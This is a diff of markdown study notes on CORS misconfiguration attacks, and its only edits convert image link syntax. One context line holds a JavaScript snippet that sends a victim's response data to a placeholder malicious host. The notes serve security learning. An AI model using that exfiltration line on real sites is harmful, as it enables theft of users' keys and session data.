@@ -12,7 +12,7 @@
 The same-origin policy restricts scripts on one origin from accessing data from another origin. An origin consists of a URI scheme, domain and port number.
 
 Example: 
-![9937ed2957707a628c92e80191eade65.png](../../_resources/9937ed2957707a628c92e80191eade65-1.png)
+![[9937ed2957707a628c92e80191eade65-1.png]]
 
 # Relaxation of the same-origin policy
 - The same-origin policy is very restrictive, so CORS allows controlled relaxation.
@@ -27,7 +27,7 @@ Tip: you might find https://www.test-cors.org/ useful for testing CORS
 ## Server-generated ACAO header from client-specified Origin header
 Maintaining a list of allowed domains requires effort and risks breaking functionality, so some apps effectively allow access from any other domain. One way to do this is by reading the `Origin` header from requests and including a response header that allows the origin, whatever it is.
 
-![4bf3ce75428dbae6dbc1d650388ed8dc.png](../../_resources/4bf3ce75428dbae6dbc1d650388ed8dc-1.png)
+![[4bf3ce75428dbae6dbc1d650388ed8dc-1.png]]
 
 The `Access-Control-Allow-Origin` header states that access is allowed from the domain(s) specified, and the `Access-Control-Allow-Credentials: true` means that cross-domain requests can include cookies (processed in-session)
 
@@ -54,7 +54,7 @@ Some apps have a whitelist of allowed origins. When a CORS request is received, 
 Any mistakes in implementation (including excessive subdomains, prefix/suffix checking, etc.) can lead to access granted to external domains.
 
 Examples:
-![d2099d96cabec1c45bfe7e591a45717d.png](../../_resources/d2099d96cabec1c45bfe7e591a45717d-1.png)
+![[d2099d96cabec1c45bfe7e591a45717d-1.png]]
 
 ## Whitelisted null origin value
 The `Origin` header supports the value `null`. Some apps might allow/whitelist the `null` origin to support local development. An attacker can use tricks to generate cross-domain requests containing the value `null` in the `Origin` header.
@@ -77,12 +77,12 @@ location='https://malicious-website.com/log?key='+this.responseText;
 ## Exploiting XSS via CORS trust relationships
 If a website trusts an origin that is vulnerable to XSS, an attacker could exploit the XSS to exfiltrate the data using CORS.
 
-![e64932527e7a132ee1c53567a5965fff.png](../../_resources/e64932527e7a132ee1c53567a5965fff-1.png)
+![[e64932527e7a132ee1c53567a5965fff-1.png]]
 
 ## Breaking TLS with poorly configured CORS
 If an app uses HTTPS while also whitelisting a trusted subdomain using plain HTTP, an attacker who can intercept the victim's traffic can exploit CORS to compromise the victim's interactions.
 
-![3f676a1361f696915b851d661facbe14.png](../../_resources/3f676a1361f696915b851d661facbe14-1.png)
+![[3f676a1361f696915b851d661facbe14-1.png]]
 
 The attack involves the following: 
 - The victim user makes any plain HTTP request.
